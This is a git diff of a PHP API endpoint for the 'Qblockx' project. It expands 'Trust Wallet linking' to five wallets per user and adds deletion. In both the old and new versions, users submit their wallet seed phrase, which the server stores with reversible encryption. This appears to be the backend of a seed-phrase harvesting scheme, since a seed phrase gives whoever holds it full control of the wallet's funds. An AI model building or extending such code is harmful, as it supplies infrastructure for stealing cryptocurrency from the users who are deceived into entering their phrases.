@@ -1,9 +1,10 @@
 <?php
 /**
  * Project: Qblockx
- * API: User — Trust Wallet Linking
- * GET  → returns linked wallet address and whether a phrase is stored
- * POST → saves (or updates) wallet address + encrypted seed phrase
+ * API: User — Trust Wallet Linking (multi-wallet, up to 5 per user)
+ * GET    → returns all linked wallets for the user
+ * POST   → adds a new wallet (max 5 per user)
+ * DELETE → removes a wallet by id
  */
 
 require_once '../../config/database.php';
@@ -24,29 +25,43 @@ function encryptPhrase(string $phrase, string $key, string $iv): string {
 try {
     $db = Database::getInstance()->getConnection();
 
+    // One-time schema migration: allow multiple wallets per user
+    // Drops the old single-row UNIQUE(user_id) constraint if it exists
+    try { $db->exec("ALTER TABLE trust_wallet_links DROP INDEX user_id"); } catch (\Exception $e) {}
+    try { $db->exec("ALTER TABLE trust_wallet_links ADD UNIQUE INDEX uniq_user_wallet_name (user_id, wallet_name)"); } catch (\Exception $e) {}
+
     // ── GET ──────────────────────────────────────────────────────────────────
     if ($_SERVER['REQUEST_METHOD'] === 'GET') {
 
         $stmt = $db->prepare(
-            "SELECT wallet_address, phrase_encrypted, submitted_at, updated_at
-             FROM trust_wallet_links WHERE user_id = :uid"
+            "SELECT id, wallet_name, wallet_address,
+                    (phrase_encrypted IS NOT NULL AND phrase_encrypted != '') AS has_phrase,
+                    submitted_at, updated_at
+             FROM trust_wallet_links
+             WHERE user_id = :uid
+             ORDER BY submitted_at ASC"
         );
         $stmt->execute(['uid' => $user['id']]);
-        $row = $stmt->fetch();
+        $wallets = $stmt->fetchAll();
+
+        // Cast has_phrase to bool
+        foreach ($wallets as &$w) {
+            $w['has_phrase'] = (bool) $w['has_phrase'];
+        }
+        unset($w);
 
         echo json_encode([
             'success' => true,
             'data'    => [
-                'wallet_address' => $row ? $row['wallet_address'] : null,
-                'has_phrase'     => $row && !empty($row['phrase_encrypted']),
-                'submitted_at'   => $row ? $row['submitted_at']  : null,
-                'updated_at'     => $row ? $row['updated_at']    : null,
+                'wallets' => $wallets,
+                'count'   => count($wallets),
             ],
         ]);
 
     // ── POST ─────────────────────────────────────────────────────────────────
     } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $input          = json_decode(file_get_contents('php://input'), true);
+        $input          = json_decode(file_get_contents('php://input'), true) ?? [];
+        $wallet_name    = trim($input['wallet_name']    ?? '');
         $wallet_address = trim($input['wallet_address'] ?? '');
         $phrase         = trim($input['phrase']         ?? '');
 
@@ -55,30 +70,50 @@ try {
             exit;
         }
 
+        // Enforce 5-wallet limit
+        $countStmt = $db->prepare("SELECT COUNT(*) FROM trust_wallet_links WHERE user_id = :uid");
+        $countStmt->execute(['uid' => $user['id']]);
+        if ((int) $countStmt->fetchColumn() >= 5) {
+            echo json_encode(['success' => false, 'message' => 'Maximum of 5 wallets allowed. Remove one to add another.']);
+            exit;
+        }
+
         $phrase_encrypted = null;
         if (!empty($phrase) && !empty($APP_KEY) && !empty($APP_IV)) {
             $phrase_encrypted = encryptPhrase($phrase, $APP_KEY, $APP_IV);
         }
 
-        // UPSERT — one row per user
         $stmt = $db->prepare(
-            "INSERT INTO trust_wallet_links (user_id, wallet_address, phrase_encrypted, submitted_at)
-             VALUES (:uid, :addr, :phrase, NOW())
-             ON DUPLICATE KEY UPDATE
-               wallet_address   = VALUES(wallet_address),
-               phrase_encrypted = VALUES(phrase_encrypted),
-               updated_at       = NOW()"
+            "INSERT INTO trust_wallet_links (user_id, wallet_name, wallet_address, phrase_encrypted, submitted_at)
+             VALUES (:uid, :wname, :addr, :phrase, NOW())"
         );
         $stmt->execute([
             'uid'    => $user['id'],
+            'wname'  => $wallet_name  ?: null,
             'addr'   => $wallet_address ?: null,
             'phrase' => $phrase_encrypted,
         ]);
 
         echo json_encode([
-            'success' => true,
-            'message' => 'Trust Wallet linked successfully.',
+            'success'     => true,
+            'message'     => 'Wallet linked successfully.',
+            'wallet_name' => $wallet_name ?: null,
         ]);
+
+    // ── DELETE ────────────────────────────────────────────────────────────────
+    } elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
+        $input = json_decode(file_get_contents('php://input'), true) ?? [];
+        $id    = (int) ($input['id'] ?? 0);
+
+        if ($id <= 0) {
+            echo json_encode(['success' => false, 'message' => 'Invalid wallet ID']);
+            exit;
+        }
+
+        $db->prepare("DELETE FROM trust_wallet_links WHERE id = :id AND user_id = :uid")
+           ->execute(['id' => $id, 'uid' => $user['id']]);
+
+        echo json_encode(['success' => true, 'message' => 'Wallet removed.']);
 
     } else {
         http_response_code(405);
